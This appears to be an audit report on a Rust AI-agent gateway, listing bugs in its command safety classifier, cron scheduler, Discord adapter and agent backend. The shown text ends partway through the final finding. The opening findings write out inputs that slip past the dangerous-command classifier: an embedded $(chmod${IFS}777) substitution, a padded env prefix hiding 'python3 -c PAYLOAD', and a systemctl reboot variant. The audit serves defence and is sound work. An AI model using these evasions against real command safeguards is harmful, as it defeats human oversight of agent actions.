### Verification-artifact cleanup skips all dangerous-pattern scanning
- Location: src/security/dangerous.rs:333
- What: The helper at src/security/dangerous.rs:305 accepts any three-token rm -f path lexically under a temp root with a hermes-verify- or hermes-ad-hoc- basename, bypassing all dangerous-pattern scanning without a symlink check.
- Trigger: Direct classifier input is rm -f /tmp/hermes-verify-$(chmod${IFS}777${IFS}file), or a prefixed basename lies beneath a temp-directory ancestor symlink pointing outside that tree.
- Impact: Executable expansion or an unverified target is exempted wholesale; end-to-end terminal bypass is not established because argv quoting and other checks still apply, and deleting a final symlink alone does not delete its referent.
- Fix: Remove the blanket early return; recognize only literal tracked artifacts with component-safe non-symlink validation, while continuing to inspect executable syntax and dangerous patterns.

### Wrapper budget exhaustion silently stops parsing
- Location: src/security/normalize.rs:522
- What: The command-word iterator returns partial results after twelve prefix words without a limit finding.
- Trigger: Direct input consisting of env, twelve assignments, then `python3 -c PAYLOAD`.
- Impact: The actual executable and its payload can evade the interpreter fallback.
- Fix: Propagate prefix-budget exhaustion as an explicit risk rather than successful partial parsing.

### systemctl global options hide hardline actions
- Location: src/security/hardline.rs:80
- What: The systemctl hardline rule assumes the lifecycle action immediately follows the executable.
- Trigger: `systemctl --no-wall reboot` on a host permitting that actor to reboot.
- Impact: The hardline action is missed; no unprivileged host reboot is demonstrated.
- Fix: Consume supported systemctl global options before classifying its action.

### Approval response write failures are ignored
- Location: src/agent/omo_backend.rs:902
- What: Allow and deny sends discard their transport Result and continue processing input.
- Trigger: The WebSocket fails while the gateway answers a pending approval.
- Impact: The immediate failure is lost and the peer may wait for a response until timeout.
- Fix: Propagate the send failure with request/session context while retaining unresolved ownership for safe cleanup.

### Respawn bypasses the initial daemon spawn lock
- Location: src/agent/omo_daemon.rs:348
- What: The watcher spawns replacements outside the mutex used by ensure.
- Trigger: Ensure for an endpoint overlaps its supervisor's restart after both observe the port unready.
- Impact: Duplicate children race to bind and readiness can be attributed to the wrong child.
- Fix: Acquire the same endpoint-scoped lock and re-probe immediately before installing a replacement.

### Per-chunk lossy UTF-8 decoding corrupts split characters
- Location: src/agent/llm.rs:245
- What: Raw stream byte chunks are independently converted with `from_utf8_lossy` before line framing.
- Trigger: The residual LlmClient receives a multibyte character split between HTTP byte chunks.
- Impact: Replacement characters permanently corrupt streamed text.
- Fix: Accumulate bytes and decode only complete newline-delimited UTF-8 records, retaining incomplete byte sequences.

### Completion can overwrite a newer schedule revision
- Location: src/cron/scheduler.rs:1264
- What: Completion guards omit schedule revision changes that leave expression and payload unchanged.
- Trigger: Pause/resume or same-spec re-registration changes a deadline while an older run completes.
- Impact: Stale completion overwrites the new deadline or disables the newly scheduled job.
- Fix: Add a schedule revision captured by CronClaim and compare it in schedule mutations, or at minimum include the observed next_run_at and a revision that changes on every reschedule. Keep run-result accounting independent of schedule ownership.

### Full shell commands expose embedded credentials in normal logs
- Location: src/cron/scheduler.rs:436
- What: Normal INFO logging includes the raw shell command.
- Trigger: A scheduled command embeds a token, password argument, or credential-bearing URL.
- Impact: Credentials are copied into the operational log without redaction.
- Fix: Log job ID and execution metadata, not the raw command; only log an explicitly redacted command representation if operationally necessary.

### Registration, resumption, and failure recovery ignore the job timezone
- Location: src/cron/scheduler.rs:756
- What: Registration, resume, and failure recovery compute deadlines without the payload timezone.
- Trigger: A daily 09:00 Asia/Seoul job is registered, resumed, or advanced after failure.
- Impact: It runs at 09:00 UTC and can switch cadence after success; this is scheduling failure, not by itself P0-class loss or bypass.
- Fix: Extract and validate the payload timezone at every scheduling boundary and pass it to next_run_tz, including failure recovery.

### Successful execution is rolled back when a cron expression has no next occurrence
- Location: src/cron/scheduler.rs:1278
- What: Failure to compute a next occurrence rolls back already-successful run completion.
- Trigger: A finite-year cron reaches its last occurrence, or a previously accepted timezone is rejected on completion.
- Impact: Already-executed side effects remain paired with a running durable lease and can be reclaimed or repeated.
- Fix: Treat schedule exhaustion as a successful terminal job state and commit the run while disabling the schedule. Validate timezone before execution, and preserve/retry completion separately from re-executing side effects when persistence fails.

### Cross-profile collision on `cron_monitor_states` primary key
- Location: src/cron/executor.rs:145
- What: Monitor hashes are keyed by the unscoped Hermes job ID.
- Trigger: Two configured profiles each run a monitor job named weather.
- Impact: One profile overwrites the other's state, causing false changes or missed alerts.
- Fix: Bind `&job.id` (the globally unique scoped identifier) instead of `&hermes.id`.

### Premature commit of monitor hash drops state change alerts on downstream execution or delivery failure
- Location: src/cron/executor.rs:164
- What: Monitor state is committed before the downstream agent and delivery succeed.
- Trigger: A changed monitor snapshot is stored and the agent run or delivery then fails.
- Impact: The next identical snapshot is treated as unchanged and its alert is lost.
- Fix: Record the new hash in session metadata or return it alongside the output, and only commit the new hash to `cron_monitor_states` in `CronScheduler::complete_success` after execution and delivery have succeeded.

### A routing error permanently removes the in-memory batch
- Location: src/discord/adapter.rs:649
- What: Routing failure is logged after the only buffered copy has been removed.
- Trigger: The incoming ledger operation fails during a transient database outage after debounce detachment.
- Impact: An admitted live message has neither a durable claim nor an in-memory retry.
- Fix: Durably stage ingress before removing it from memory, or retain/requeue the batch with bounded backoff and explicit terminal failure handling.

### Backfill advances its durability cursor past in-progress duplicates
- Location: src/discord/adapter.rs:1235
- What: Backfill treats an in-progress duplicate claim as completed durable work.
- Trigger: Live ingress owns a message claim, backfill advances beyond it, and the live turn then fails or the process exits.
- Impact: Recovery can skip a message whose turn never completed.
- Fix: Distinguish delivered duplicates from in-progress claims and wait for their terminal outcome, or hold the cursor until durable completion is established.

### Backfill suppresses cursor persistence errors and advances anyway
- Location: src/discord/adapter.rs:3733
- What: Backfill ignores cursor-write errors while advancing its local cursor.
- Trigger: A database write fails after a backfilled turn finishes.
- Impact: Recovery reports progress that is not durable and silently repeats work after restart.
- Fix: Propagate the write error or halt that channel, preserving the last durable cursor and reporting incomplete recovery.

### Filtered history never persists progress
- Location: src/discord/adapter.rs:3754
- What: Conclusive history rejection advances only the scan-local cursor.
- Trigger: A channel accumulates a long tail of filtered bot, system, or unmentioned messages across reconnects.
- Impact: The same history is repeatedly fetched and checked, consuming API calls and recovery time.
- Fix: Persist progress for conclusively filtered messages too, while distinguishing transient metadata/admission failures that must hold the cursor.

### Live traffic and startup recovery use different cursor stores
- Location: src/discord/adapter.rs:784
- What: Live ingress writes legacy cursors while nonempty bot IDs recover from bot-scoped cursors.
- Trigger: The gateway restarts after live traffic in a previously used DM or unconfigured guild channel, or after more than 50 missed configured-channel messages.
- Impact: Recovery omits channels or starts too late and misses offline messages.
- Fix: Persist bot-scoped recovery state for live deliveries and discover channels from that same state. Advance the durable completion cursor after routing succeeds, not merely when an event arrives; migrate existing legacy rows explicitly.

### One bot's gateway traffic masks another bot's receive failure
- Location: src/discord/adapter.rs:1947
- What: All bot watchdogs share one process-global receive timestamp.
- Trigger: Bot B stops receiving while healthy bot A continues normal gateway traffic.
- Impact: A masks B's silence and B's watchdog does not attempt recovery.
- Fix: Store the receive timestamp per client/bot (and shard if applicable), and pass that state to the matching watchdog.

### Replay acknowledges success even when obligation state updates fail
- Location: src/discord/adapter.rs:2488
- What: Replay reports delivered counts even when obligation-state persistence fails.
- Trigger: Discord accepts a replay and the following delivered-state write fails.
- Impact: Visible delivery and durable obligation state diverge, allowing duplicates or stranded work.
- Fix: Propagate or explicitly aggregate obligation-state update errors and distinguish claimed, delivered, and failed counts.

### Successful finalization erases duplicate-sequence protection
- Location: src/discord/adapter.rs:2679
- What: Removing a completed stream also removes its sequence replay protection.
- Trigger: The same final stream UUID and sequence is delivered again after successful cleanup.
- Impact: A second placeholder and duplicate response are sent.
- Fix: Keep a bounded completed-stream tombstone with the terminal sequence, or deduplicate final delivery durably before creating a new placeholder.

### Transient role lookup failures silently skip recoverable history
- Location: src/discord/adapter.rs:3675
- What: A failed role lookup is treated like successful empty-role metadata.
- Trigger: A REST message has no member metadata, admission relies on a role, and the role HTTP lookup temporarily fails.
- Impact: The authorized message is filtered and later cursor advancement can make the loss permanent.
- Fix: Keep lookup failure distinct from a successful empty-role result. If admission depends on unavailable roles, stop that channel's scan without advancing its cursor and report the lookup error.

### Always approval reports success even when persistence fails
- Location: src/discord/approval.rs:489
- What: Always approval publishes the in-memory grant before a fallible database write and returns no persistence result.
- Trigger: The allowlist INSERT fails because the database is read-only, full, or unavailable.
- Impact: The requester sees permanent approval while durable and live permissions disagree.
- Fix: Return a persistence Result, persist before publishing the global cache entry, and propagate failure to the requester rather than reporting a permanent grant. If persistence is unavailable, explicitly downgrade to Once only with a visible non-persistent outcome.

### Pairing can consume the code without publishing authorization to the cache
- Location: src/discord/pairing.rs:513
- What: Pairing commits code consumption before cancellable cache publication.
- Trigger: The approval future is cancelled after commit while awaiting the paired-cache write lock.
- Impact: The code is gone but the live cache continues denying the durably paired user.
- Fix: Make committed cache publication cancellation-safe, for example by giving a separately owned operation responsibility for both commit and publication, or add database reconciliation on cache misses so durable paired state cannot remain invisible. Preserve the current rule against granting access before a successful commit.

### Unauthorized DM notification records have no retention bound
- Location: src/discord/pairing.rs:370
- What: Notification throttle rows have no expiry or deletion path in the reviewed pairing lifecycle.
- Trigger: Many distinct unauthorized Discord accounts send DMs over sustained operation.
- Impact: Persistent rows outlive codes; a realistic disk-exhaustion rate from unique accounts is not established.
- Fix: Prune notification rows whose timestamps are older than the rate-limit window during issuance/cleanup, and remove a user's notification row after successful pairing. Keep recent throttle reservations intact.

### Config import omits provider credentials stored in dotenv
- Location: src/migrate/config_import.rs:351
- What: Provider credentials are taken from model YAML and are absent from the scalar dotenv key list.
- Trigger: Hermes keeps OPENAI_API_KEY or ANTHROPIC_API_KEY only in its root/profile .env.
- Impact: The resulting gateway environment lacks provider credentials.
- Fix: Add provider keys and base URLs to the dotenv fallback mapping with explicit precedence.

### Config merge removes existing Discord tokens without replacements
- Location: src/migrate/config_import.rs:531
- What: Existing Discord token assignments are skipped when the overlay has no corresponding tokens.
- Trigger: Hermes Discord is disabled or tokenless while the target gateway .env already has valid tokens.
- Impact: The migrated environment loses its active credentials and may no longer start the intended Discord service.
- Fix: Preserve existing token assignments unless valid replacements or an explicit removal request are provided.

### Inherited timezone prevents payload verification
- Location: src/migrate/cron_cutover.rs:343
- What: Cutover compares source and imported payloads without applying the store's inherited timezone consistently.
- Trigger: A store has a default timezone and a job omits its own timezone before synchronization injects it.
- Impact: Cutover refuses the job after Hermes shutdown, leaving an operationally interrupted migration rather than silent data loss.
- Fix: Apply the same inherited timezone to the source payload before comparing it to the imported job.

### Late completion can overwrite a delivered ledger status
- Location: src/ledger/service.rs:291
- What: Completion unconditionally updates status and completion timestamps by message ID.
- Trigger: A late failure callback or duplicate completion runs after the message has been marked delivered.
- Impact: Delivered status and processing-latency accounting are overwritten, potentially enabling unintended retry.
- Fix: Guard allowed state transitions in SQL and make repeated terminal completion idempotent without regressing delivered state.

### Missing Discord prefix introduces an empty-ID lookup alternative
- Location: src/ledger/service.rs:155
- What: Unprefixed message IDs bind an empty alternate ID in duplicate/completed/get queries.
- Trigger: The ledger contains an empty `message_id` and a later lookup uses an unprefixed nonempty ID.
- Impact: The unrelated empty row can make messages falsely duplicate/completed or return the wrong entry.
- Fix: Use `unwrap_or(message_id)` rather than the empty default in all three lookup variants.

### Recovery claim can reclaim an obligation delivered after selection
- Location: src/ledger/service.rs:514
- What: The claim UPDATE checks owner identity but not whether obligation state remains recoverable.
- Trigger: An eligible candidate becomes delivered between the sweeper SELECT and claim UPDATE while still matching its owner predicate.
- Impact: A completed obligation can be returned for replay, producing duplicate user-visible delivery.
- Fix: Repeat the recoverable-state predicate in the claim UPDATE and only return successfully claimed rows.

### Future restart timestamps survive backward clock jumps
- Location: src/multiplexer/restart_loop_guard.rs:89
- What: Future timestamps are skipped for gap comparison but retained in the counted chain.
- Trigger: Persisted boots are `[1000,1010,1020]` and the wall clock moves back to 0.
- Impact: The restart breaker can block legitimate recovery based on future history.
- Fix: Filter/reset anomalous future entries under an explicit clock-skew policy before chain counting and retention.

### Model persistence replaces unrelated state from a stale snapshot
- Location: src/multiplexer/router.rs:406
- What: SetModel reads and later replaces all state JSON without version coordination.
- Trigger: An actor persists a new binding or suspension between the router's read and write, then retires before its model command can repair state.
- Impact: Unrelated durable fields are overwritten by the stale snapshot.
- Fix: Let live actors own mutations and use a coordinated atomic JSON-field update for absent actors.

### Pending overflow drops already accepted plain events
- Location: src/multiplexer/actor.rs:309
- What: The actor drops events when its secondary queue is full after route has already returned mailbox acceptance.
- Trigger: A blocked turn receives more than 64 pending plain events with no delivery acknowledgement ID.
- Impact: Accepted conversation turns are lost with only a warning; this requires burst/sustained load.
- Fix: Reserve pending capacity before reporting admission or return an explicit admission acknowledgement for every event.

### Reset is lost for collected or retiring sessions
- Location: src/multiplexer/router.rs:420
- What: Reset has no storage fallback and discards live-handle/reset outcomes.
- Trigger: Reset targets a GC-collected session or races with its retirement.
- Impact: The caller receives success while the next event reloads unchanged state.
- Fix: Use retirement-aware retry and propagate reset errors; load/reset persisted state when no actor exists.

### Turn completion overwrites an acknowledged concurrent model change
- Location: src/multiplexer/actor.rs:424
- What: Successful completion replaces actor state with the pre-change runner clone.
- Trigger: SetModel is acknowledged while a turn is running, and that old turn subsequently succeeds.
- Impact: The new model selection is silently overwritten in memory and in the following flush.
- Fix: Merge actor-owned model changes after completion or defer model acknowledgements until serialized application at the turn boundary.

### Credential readiness accepts empty unrelated keys
- Location: src/readiness.rs:193
- What: Provider readiness accepts mere existence of any recognized API-key variable.
- Trigger: The model is Claude but the only key is `OPENAI_API_KEY=`.
- Impact: The report asserts usable credentials without a usable credential for the resolved provider; daemon-stored credentials can produce the inverse error.
- Fix: Probe authentication at the actual daemon/provider route rather than inferring it from unrelated local variables.

### Drain watcher is created late and not attached to ingress
- Location: src/main.rs:876
- What: Production starts the watcher after work admission and never attaches its receiver to the multiplexer.
- Trigger: A drain marker exists at startup, or a new turn arrives while drain shutdown is persisting its session snapshot.
- Impact: Recovery/cron can run despite the marker, and newly accepted turns can fall outside the recovery snapshot.
- Fix: Scan and attach the drain receiver before recovery or ingress starts; close admissions before checkpointing sessions.

### Recovery consumes durable retry intent before execution succeeds
- Location: src/main.rs:449
- What: Gateway recovery clears its pending marker before routing, and alternate recovery repeats the ordering at src/multiplexer/actor.rs:88 and src/storage/db.rs:529.
- Trigger: Actor startup, SQLite lookup, or routing fails, draining refuses admission, or the process exits between clearing the marker and durable completion.
- Impact: Unfinished turns disappear from subsequent pending-session recovery.
- Fix: Keep durable pending/claimed state through terminal completion, release failed claims for retry, and share the protocol across all three implementations.

### Shutdown ignores failed resume-marker persistence
- Location: src/main.rs:888
- What: Signal and marker shutdown branches discard errors while marking sessions pending.
- Trigger: SQLite is busy, full, or unavailable during the marking pass.
- Impact: Shutdown can report success while interrupted sessions lack durable recovery markers.
- Fix: Preserve a failure shutdown result, report affected persistence errors, and apply a bounded retry before terminating work.

### Suspension updates overwrite concurrent state changes
- Location: src/storage/db.rs:384
- What: mark_session_suspended reads and later rewrites the full state JSON without a transaction.
- Trigger: persist_session_binding updates metadata between the suspension SELECT and UPDATE.
- Impact: The stale suspension write silently overwrites the new binding in a narrow race.
- Fix: Use one atomic json_set update of the suspended field.

### Cron update replaces malformed payloads with an empty object
- Location: src/tools/cron.rs:409
- What: The update action substitutes an empty object for malformed persisted payload JSON and subsequently serializes that replacement into cron_jobs.
- Trigger: An existing job has malformed payload_json and the caller updates only its enabled flag, schedule, or another field.
- Impact: The update silently replaces the previous malformed bytes with an empty or partially rebuilt payload, obscuring the corruption and discarding recoverable job settings; the cited path is an update, not a display operation.
- Fix: Propagate the payload parse error and refuse the update before changing any job fields, leaving the original bytes intact for repair.

### Web fetch discloses target URLs to an unconditional external proxy
- Location: src/tools/web.rs:159
- What: Every validated target URL is embedded in a request to r.jina.ai rather than fetched directly or through an explicitly selected provider.
- Trigger: A user asks web_fetch to read an HTTPS URL containing a private path or bearer query token, such as `https://example.invalid/report?token=secret-value`.
- Impact: The target path and query credential are disclosed to the third-party reader; content it can retrieve also passes through that service, but access to gateway-local services or browser-authenticated content is not established.
- Fix: Make third-party reader use an explicit configurable choice and reject credential-bearing URLs on that route; provide direct fetching only with an appropriate destination and redirect policy.

### Backend thread cache retains completed session identities indefinitely
- Location: src/agent/omo_backend.rs:414
- What: New non-cron sessions add bindings to a backend-wide map without normal retirement eviction.
- Trigger: A long-lived backend handles sustained creation of distinct session keys.
- Impact: Retained memory grows after actors finish/are collected; the source does not establish an OOM rate within realistic uptime.
- Fix: Bound or remove the duplicate fallback cache, or evict entries on session retirement/reset.

### Daemon setup performs blocking filesystem work on async workers
- Location: src/agent/omo_daemon.rs:180
- What: Async ensure/watcher paths synchronously resolve binaries and create/open log files.
- Trigger: HOME/PATH candidates or log directories reside on a stalled filesystem.
- Impact: A runtime worker blocks, and ensure can hold the global spawn mutex throughout the stall.
- Fix: Prepare filesystem-dependent command resources using asynchronous or bounded blocking work before the spawn ownership transition.

### Deadline drain can finalize another turn's output
- Location: src/agent/omo_backend.rs:638
- What: Deadline cleanup accumulates uncorrelated content and its success branch does not require `terminal_confirmed`.
- Trigger: The turn reaches its deadline and the peer sends another thread/turn's deltas or completed terminal during cleanup.
- Impact: Unrelated content can be delivered/persisted and cron acknowledged while the actual turn remains unresolved.
- Fix: Apply thread/turn correlation before every drain mutation and require a correlated completed terminal for success.

### Fast empty terminal notifications are forgotten
- Location: src/agent/omo_backend.rs:1034
- What: A correlated empty completed terminal is discarded during the grace interval without deferred reconsideration.
- Trigger: A genuine empty turn completes inside `no_content_grace` and the peer sends no later terminal.
- Impact: The gateway times out/interrupts an already finished turn and retains ownership unnecessarily.
- Fix: Finalize correlated terminals immediately or retain and reconsider the suspected premature terminal at a bounded deadline.

### Notifications before the start acknowledgement are discarded
- Location: src/agent/omo_backend.rs:921
- What: Turn-bearing notifications received before the start response are dropped rather than correlated later.
- Trigger: A peer emits current-turn deltas or its only terminal before replying to request ID 3.
- Impact: Output is incomplete or a finished turn waits until timeout.
- Fix: Buffer a bounded set of pre-ACK notifications and replay only those matching the acknowledged thread/turn.

### Turn deadlines do not bound writes and downstream awaits
- Location: src/agent/omo_backend.rs:508
- What: Socket writes and several dispatcher/database/finalization awaits sit outside an enforced turn-wide timeout.
- Trigger: The peer stops reading a large start/interrupt write, or downstream dispatch stalls.
- Impact: Deadline checks cannot run, so turn completion and reserved cleanup can hang past their budgets.
- Fix: Bound external awaits by work/cleanup deadlines and separately bound finalization while retaining ambiguous remote ownership.

### Turn output accumulation is uncapped and copies every prefix
- Location: src/agent/omo_backend.rs:972
- What: Text and item tracking have no aggregate quota, while each delta clones the growing text.
- Trigger: A fast peer emits many small deltas or many unique item IDs during long/concurrent turns.
- Impact: Sustained load causes large allocations and quadratic copying; a realistic normal-uptime exhaustion bound was not demonstrated.
- Fix: Enforce per-turn text/item limits and coalesce updates, interrupting with an explicit overflow error.

### Unsupported reverse requests receive no JSON-RPC response
- Location: src/agent/omo_backend.rs:856
- What: Inbound requests are answered only if their method matches the approval heuristic.
- Trigger: The daemon sends an unsupported request with both id and method and waits for its reply.
- Impact: The turn can stall until timeout instead of receiving an explicit unsupported-method error.
- Fix: Classify requests separately from notifications and return correlated JSON-RPC -32601 for unsupported methods.

### Image payload construction synchronously reads files on Tokio workers
- Location: src/agent/llm.rs:461
- What: Async stream setup calls synchronous attachment reads during payload construction.
- Trigger: A large image or slow filesystem is read while constructing an LLM request.
- Impact: A runtime worker stalls and unrelated async work suffers latency.
- Fix: Read attachment bytes asynchronously before building payloads or offload file preparation to bounded blocking work.

### Stalled LLM streams retain background tasks without timeout
- Location: src/agent/llm.rs:152
- What: The HTTP client and spawned byte-stream reader lack explicit request/read deadlines and cancellation handling.
- Trigger: A provider stalls mid-stream without closing TCP, including after its stream consumer is dropped.
- Impact: The background task and connection can remain indefinitely; retries alone would not fix this.
- Fix: Configure connection/read budgets and select the reader against consumer closure or cancellation.

### Zero-valued configured turn timeouts are accepted
- Location: src/agent/omo_config.rs:151
- What: Environment timeout parsing accepts zero despite requiring a positive timeout operationally.
- Trigger: An operator sets `OMON_OMO_TURN_TIMEOUT_SECS=0` or an interactive/cron total-timeout variable to zero.
- Impact: Turns immediately hit their gap/total deadline rather than configuration failing at boot.
- Fix: Reject zero at environment parsing and report the offending variable before startup side effects.

### Backward wall-clock steps can replay an already executed cron occurrence
- Location: src/cron/scheduler.rs:1194
- What: Recurring advancement uses completion wall time without the claimed occurrence as a lower bound.
- Trigger: A job due at 12:01 completes after the wall clock steps back to 12:00:30.
- Impact: The next deadline becomes 12:01 again and the same nominal occurrence can run twice.
- Fix: Persist the claimed nominal firing time and compute advancement after at least max(completion_now, claimed_scheduled_time). Use an occurrence key if duplicate exclusion must survive clock corrections and reclamation.

### Claim validation and the executed job snapshot are not atomic
- Location: src/cron/scheduler.rs:1118
- What: Eligibility checks, claim insertion, and fetching the executed job snapshot are separate operations.
- Trigger: Re-registration or manual completion interleaves between those awaits, or the post-claim job fetch fails.
- Impact: A claim can execute a different revision, exceed a stale repeat budget, or retain an unserviced running lease.
- Fix: Validate, claim, and capture the exact job revision in one transaction; include revision/limit checks in the claim and return that snapshot. Roll back the claim if its snapshot cannot be obtained.

### Delete and reschedule leave old executions running
- Location: src/cron/scheduler.rs:875
- What: Deleting or rescheduling a job does not cancel its already claimed execution.
- Trigger: An operator deletes or replaces a job while its command or backend is still running.
- Impact: Old work can deliver after the mutation using its retained snapshot.
- Fix: Track executions by job/run revision and cancel them when the applicable mutation invalidates that revision. Revalidate the active revision before delivery and terminate owned subprocesses on cancellation.

### Resume writes a deadline calculated from a stale expression
- Location: src/cron/scheduler.rs:859
- What: Resume updates by ID after calculating a deadline from a separately fetched expression.
- Trigger: Concurrent re-registration changes the expression, or deletion removes the row between resume's read and write.
- Impact: Resume installs a stale deadline or reports success after a zero-row update.
- Fix: Compare the observed job revision in the UPDATE and use rows_affected to detect a conflicting edit or deletion; retry against a fresh snapshot only when appropriate.

### Blocking filesystem I/O inside asynchronous execution paths
- Location: src/cron/executor.rs:808
- What: Cron execution performs synchronous file reads and traversal on async workers.
- Trigger: Scripts or skills reside on a slow or stalled filesystem.
- Impact: Worker starvation delays execution and time-sensitive scheduling tasks.
- Fix: Use `tokio::fs` or offload synchronous file traversal to `tokio::task::spawn_blocking`.

### Subprocess leak on ack command timeout due to missing process group and process tree termination
- Location: src/cron/ack.rs:38
- What: Ack timeout kills only the shell rather than its process group.
- Trigger: An ack shell launches a long-lived child or pipeline and exceeds its timeout.
- Impact: Descendants can survive and keep consuming resources or holding locks.
- Fix: Start the shell in an owned process group, retain child/group identity outside the timed wait, and terminate and reap the group on timeout or cancellation.

### TOCTOU race condition and unbounded key growth in `set_cron_notepad`
- Location: src/cron/store.rs:1022
- What: Notepad capacity checks are non-atomic and count values but not keys.
- Trigger: Concurrent writes pass the same 64 KiB check, or many distinct long keys store empty values.
- Impact: Storage and assembled prompt size exceed the intended cap.
- Fix: Enforce aggregate key-plus-value bytes and entry count under one serialized database write transaction.

### Unbounded agent backend execution duration lacking timeout enforcement
- Location: src/cron/executor.rs:336
- What: The agent executor awaits the backend without its own execution deadline.
- Trigger: A backend dependency never returns or a model/tool loop fails to terminate.
- Impact: The cron task and its lease heartbeat remain active indefinitely.
- Fix: Apply an execution-wide deadline that requests backend cancellation and awaits bounded cleanup; retain unresolved remote ownership instead of assuming that dropping a future stops remote work.

### Validation failure during synchronization causes silent permanent deletion of existing cron jobs
- Location: src/cron/store.rs:942
- What: A job failing validation is omitted from the live set and deleted as an orphan.
- Trigger: An existing mirrored job's source definition temporarily gains an invalid schedule or timezone.
- Impact: Its previous valid database row and runtime accounting are deleted rather than retained for repair.
- Fix: Distinguish between parse/validation errors and deliberate job deletions: only delete jobs if all jobs in the source file parsed and validated cleanly, or retain unvalidated existing IDs in `live` with an error flag so they are not pruned.

### Half-open WebSockets have no application liveness deadline
- Location: src/dashboard.rs:1209
- What: WebSocket loops have no application-level liveness deadline for silent peers.
- Trigger: A connection becomes half-open through a network blackhole while no traffic exposes the disconnect.
- Impact: The connection can retain resources indefinitely; absence of explicit builder limits does not mean Axum has unlimited default frame sizes.
- Fix: Add bounded ping/pong or idle-deadline handling and set explicit conservative frame/message limits rather than assuming framework defaults are unlimited.

### OutboundAction::ExpireApproval is never forwarded to session WebSocket subscribers
- Location: src/dashboard.rs:518
- What: Approval-expiry actions have no session routing identity for WebSocket delivery.
- Trigger: An approval shown to a connected session is resolved or expires.
- Impact: The session socket never receives its retirement event and the client can retain stale approval UI.
- Fix: Track the mapping from `request_id` to `SessionKey` in `WebDashboardDispatcher` and inspect this mapping to provide the target session for `ExpireApproval` events.

### Synchronous fs2 disk space metrics block async worker threads in status and readiness handlers
- Location: src/dashboard.rs:583
- What: Status and readiness handlers synchronously sample filesystem capacity.
- Trigger: The workspace is on a slow or unresponsive NFS, SMB, or FUSE mount.
- Impact: statvfs blocks an async worker and delays unrelated requests.
- Fix: Offload disk sampling to `tokio::task::spawn_blocking` or cache sampled values in a background polling loop.

### Unbounded SQL queries and response payloads in cron, bot, and allowlist listings
- Location: src/dashboard.rs:1418
- What: Cron, bot, and approval-allowlist listings materialize all rows without pagination.
- Trigger: A deployment accumulates many entries and clients repeatedly request the listings.
- Impact: Large queries and responses increase latency and memory use under sustained load.
- Fix: Apply standard pagination (`PageQuery`) with maximum limit clamping to all listing endpoints.

### Continuous channel traffic grows the debounce buffer without a bound
- Location: src/discord/adapter.rs:605
- What: Trailing-edge debounce has no independent batch age or size bound.
- Trigger: Authorized messages keep arriving in one shared channel less than 600 ms apart for a sustained period.
- Impact: The batch never flushes and retains every event; exhaustion depends on traffic volume and duration.
- Fix: Impose a maximum batch age and size and flush on either limit, independently of the trailing-edge debounce timer.

### Failed final stream processing leaves unbounded retained stream entries
- Location: src/discord/adapter.rs:2644
- What: Terminal stream errors bypass removal of the allocated stream entry.
- Trigger: Fresh stream IDs repeatedly finalize with nonexistent MEDIA paths or failing HTTP operations after placeholder creation.
- Impact: Failed streams retain throttlers and related state indefinitely; realistic exhaustion rate is not demonstrated.
- Fix: Validate before allocating a placeholder and guarantee stream-map/typing cleanup on terminal error, retaining retry state only under an explicit bounded retry policy.

### Receive watchdog tasks outlive the clients they monitor
- Location: src/discord/adapter.rs:1941
- What: A detached infinite receive watchdog is not tied to client termination.
- Trigger: An adapter stops or fails and is restarted in the same process.
- Impact: Old tasks retain shard managers and continue acting on stopped clients.
- Fix: Tie the watchdog to the client's lifetime with a cancellation token or retained task handle and shut it down when client.start returns.

### Synchronous filesystem validation runs on async executor workers
- Location: src/discord/adapter.rs:51
- What: Media validation performs synchronous filesystem operations inside async dispatch.
- Trigger: Canonicalization or existence checks hit a slow or stalled workspace mount.
- Impact: A Tokio worker is blocked and unrelated async work can be delayed.
- Fix: Move the complete filesystem validation operation into spawn_blocking, or use async filesystem APIs for the relevant checks.

### Typing refresh throttling conflates bot identities and is not cleared on stop
- Location: src/discord/adapter.rs:2001
- What: Typing refresh state uses channel identity alone and survives cancellation.
- Trigger: Two bots refresh in the same channel, or turns are cancelled before finalization across many channels.
- Impact: One bot suppresses another's indicator and abandoned timestamps accumulate.
- Fix: Key refresh state by bot identity and channel, and remove that identity's refresh state on stop/cancellation as well as successful finalization.

### Typing start can install a guard after typing stop completes
- Location: src/discord/adapter.rs:3067
- What: Typing start installs its guard after an awaited broadcast without checking for a newer stop.
- Trigger: Typing(false) runs while the active branch awaits a slow or rate-limited broadcast.
- Impact: A stale start installs a guard after stop completed.
- Fix: Serialize typing state transitions or install a generation-tagged guard before network awaits and reject stale starts after a stop.

### Heartbeat wait can accept an approval after its deadline
- Location: src/discord/approval.rs:99
- What: The approval waiter prioritizes a ready decision over an already elapsed timeout.
- Trigger: Executor contention delays polling across the deadline and a late click resolves the still-pending entry.
- Impact: An approval can be accepted after its configured deadline.
- Fix: Store the effective deadline with the pending request and check it when resolving under the pending lock. In the heartbeat waiter, reject an elapsed deadline before consuming a newly received approval, or include the decision's resolution timestamp if pre-deadline decisions must remain valid after delayed polling.

### Multibyte retained chunks are over-truncated after the split cap
- Location: src/discord/throttler.rs:335
- What: The retained final chunk is budgeted by UTF-8 bytes instead of Unicode characters.
- Trigger: The response exceeds MAX_SPLIT_MESSAGES and its final retained chunk contains multibyte text.
- Impact: The explicitly truncated response loses substantially more retained text than its character budget requires.
- Fix: Compare character counts instead of byte lengths: `if last.chars().count() > budget_chars` where `budget_chars = DISCORD_MESSAGE_LIMIT.saturating_sub(TRUNCATION_NOTICE.chars().count())`, and truncate using character boundary indices rather than byte offsets.

### Synchronous system font loading blocks async Tokio worker thread on every table render
- Location: src/discord/table_render/mod.rs:304
- What: Each synchronous table render reloads system fonts on the async dispatch worker.
- Trigger: Concurrent responses contain tables or the font filesystem is slow.
- Impact: Filesystem traversal and rendering stall async workers and increase latency.
- Fix: Initialize the `usvg::fontdb::Database` once using a `LazyLock<Arc<usvg::fontdb::Database>>` or global cache, and share it across calls. Offload `svg_to_png` rendering to `tokio::task::spawn_blocking`.

### Temporary `.part` download files leak indefinitely on cancelled futures
- Location: src/discord/attachments.rs:375
- What: Partial attachment files are only removed on a returned download error.
- Trigger: The hydration future is cancelled after creating a .part file but before stream_to_file returns.
- Impact: Partial files survive cancellation and accumulate across repeated interrupted downloads.
- Fix: Implement a drop-guard (RAII temp-file wrapper) that removes the partial file when dropped unless marked committed, and scan/remove `.part` files in `AttachmentDownloader::new`.

### `/tools` response concatenates unbounded tool/endpoint lists and exceeds Discord 2,000-character limit
- Location: src/discord/commands.rs:887
- What: The tools command sends all tool and endpoint descriptions in one message.
- Trigger: Configured tools and endpoints together exceed 2000 characters.
- Impact: The command fails at Discord's content limit.
